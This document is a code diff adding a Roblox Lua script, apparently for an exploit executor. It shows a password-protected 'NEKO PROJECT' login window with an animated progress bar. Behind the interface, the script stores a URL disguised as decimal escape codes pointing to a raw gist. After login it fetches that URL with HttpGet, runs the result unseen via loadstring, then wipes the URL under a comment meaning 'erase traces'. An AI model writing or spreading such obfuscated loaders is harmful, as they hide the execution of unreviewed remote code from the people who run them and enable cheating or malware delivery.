@@ -1,0 +1,139 @@
+-- [[ 🐾 NEKO PRIVATE SYSTEM - INTEGRATED 2026 🐾 ]] --
+
+local CorrectKey = "KAWAIINONEKO" -- 🌸 主人設定的可愛密碼
+local _0xUrl = "\104\116\116\112\115\058\047\047\103\105\115\116\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\119\116\102\054\055\048\049\051\056\053\045\115\116\097\099\107\047\097\097\099\101\102\098\053\054\050\051\051\057\048\051\056\050\101\049\053\057\098\051\101\053\049\098\101\055\098\053\051\048\047\114\097\119\047\078\069\075\079"
+
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local lp = game:GetService("Players").LocalPlayer
+
+-- [[ UI ROOT ]]
+local sg = Instance.new("ScreenGui", CoreGui)
+sg.Name = "Neko_Ultimate_Access"
+
+-- [[ 1. 驗證與動畫主體 ]]
+local Main = Instance.new("Frame", sg)
+Main.Size = UDim2.new(0, 360, 0, 240)
+Main.Position = UDim2.new(0.5, -180, 0.5, -120)
+Main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+Main.BackgroundTransparency = 0.1
+Main.BorderSizePixel = 0
+Main.ClipsDescendants = true
+Main.Draggable = true
+Main.Active = true
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 15)
+
+-- 科技感旋轉漸層邊框
+local mStroke = Instance.new("UIStroke", Main)
+mStroke.Thickness = 3
+mStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+local mGradient = Instance.new("UIGradient", mStroke)
+mGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 180)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 170, 255))
+}
+
+task.spawn(function()
+    while Main and Main.Parent do
+        mGradient.Rotation = mGradient.Rotation + 1.5
+        task.wait(0.01)
+    end
+end)
+
+-- 標題
+local Title = Instance.new("TextLabel", Main)
+Title.Size = UDim2.new(1, 0, 0, 60)
+Title.Text = "N E K O   P R O J E C T"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+
+-- 輸入與按鈕容器 (用於切換動畫)
+local Content = Instance.new("Frame", Main)
+Content.Size = UDim2.new(1, 0, 1, -60)
+Content.Position = UDim2.new(0, 0, 0, 60)
+Content.BackgroundTransparency = 1
+
+local KeyBox = Instance.new("TextBox", Content)
+KeyBox.Size = UDim2.new(0, 280, 0, 45)
+KeyBox.Position = UDim2.new(0.5, -140, 0.15, 0)
+KeyBox.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+KeyBox.PlaceholderText = "輸入可愛密碼..."
+KeyBox.Text = ""
+KeyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyBox.Font = Enum.Font.Gotham
+Instance.new("UICorner", KeyBox)
+
+local LoginBtn = Instance.new("TextButton", Content)
+LoginBtn.Size = UDim2.new(0, 280, 0, 45)
+LoginBtn.Position = UDim2.new(0.5, -140, 0.55, 0)
+LoginBtn.BackgroundColor3 = Color3.fromRGB(255, 120, 180)
+LoginBtn.Text = "驗證身分"
+LoginBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoginBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", LoginBtn)
+
+-- [[ 2. 驗證與載入動畫邏輯 ]]
+LoginBtn.MouseButton1Click:Connect(function()
+    if KeyBox.Text == CorrectKey then
+        -- 驗證成功動畫
+        LoginBtn.Text = "歡迎回來，主人喵！🐾"
+        LoginBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+        task.wait(0.5)
+        
+        -- 切換到進度條模式
+        Content:ClearAllChildren()
+        
+        local info = Instance.new("TextLabel", Content)
+        info.Size = UDim2.new(1, 0, 0, 40)
+        info.Position = UDim2.new(0, 0, 0.1, 0)
+        info.Text = "系統初始化中..."
+        info.TextColor3 = Color3.fromRGB(255, 255, 255)
+        info.BackgroundTransparency = 1
+        info.Font = Enum.Font.GothamBold
+        info.TextSize = 14
+
+        local barBg = Instance.new("Frame", Content)
+        barBg.Size = UDim2.new(0, 280, 0, 6)
+        barBg.Position = UDim2.new(0.5, -140, 0.5, 0)
+        barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        Instance.new("UICorner", barBg)
+        
+        local bar = Instance.new("Frame", barBg)
+        bar.Size = UDim2.new(0, 0, 1, 0)
+        bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+        Instance.new("UICorner", bar)
+
+        -- 進度條跑動
+        local tween = TweenService:Create(bar, TweenInfo.new(2, Enum.EasingStyle.Quart), {Size = UDim2.new(1, 0, 1, 0)})
+        tween:Play()
+        
+        tween.Completed:Connect(function()
+            info.Text = "核心載入成功！"
+            task.wait(0.5)
+            TweenService:Create(Main, TweenInfo.new(0.5), {Size = UDim2.new(0,0,0,0), BackgroundTransparency = 1}):Play()
+            task.wait(0.5)
+            sg:Destroy()
+            
+            -- [[ 3. 執行加密 LOADER ]]
+            task.spawn(function()
+                local success, content = pcall(function() return game:HttpGet(_0xUrl) end)
+                if success and content then
+                    local loader = loadstring(content)
+                    if loader then loader() end
+                else
+                    warn("🐾 NEKO: 核心載入失敗喵！")
+                end
+                _0xUrl = nil -- 抹除痕跡
+            end)
+        end)
+    else
+        LoginBtn.Text = "密碼錯誤喵！(QAQ)"
+        LoginBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+        task.wait(1.5)
+        LoginBtn.Text = "驗證身分"
+        LoginBtn.BackgroundColor3 = Color3.fromRGB(255, 120, 180)
+    end
+end)
